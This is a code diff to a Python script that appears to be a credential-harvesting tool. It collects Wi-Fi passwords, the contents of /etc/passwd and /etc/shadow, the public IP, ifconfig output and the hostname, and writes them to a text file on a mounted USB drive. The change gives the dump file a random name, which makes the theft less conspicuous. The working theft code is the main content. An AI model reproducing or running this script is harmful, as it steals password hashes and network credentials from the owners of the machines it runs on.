@@ -1,4 +1,5 @@
 import requests
+import random
 import socket
 import subprocess
 import os
@@ -58,7 +59,13 @@ else:
 		ip="Either not connected to the internet or connection too slow."
 
 	ifconfig=subprocess.check_output(["ifconfig"], encoding='utf-8')
-	f=open(f"/media/{name}/{disk_name}/dataaboutthepc.txt",'w+')
+	name_random=random.choice(["alpha","beta","gamma"])
+	name_num=random.randrange(10*2,10**3)
+	name_of_txt=f"data{name_random}{name_num}"
+
+	os.chdir(f"/media/{name}/{disk_name}")
+
+	f=open(f"{name_of_txt}.txt",'w+')
 	f.write(f"Wi-Fi Passwords:\n\n{wifi_passwords}\n\n\nAccount Information and Password Hashes(from /etc/passwd and /etc/shadow:\n\n {passwd}\n\n{encrypted}\n\nPublic IP Address of the computer:{ip.text}\n\nifconfig output: {ifconfig}\n\nHostname: {socket.gethostname()}")
 	f.close()
 
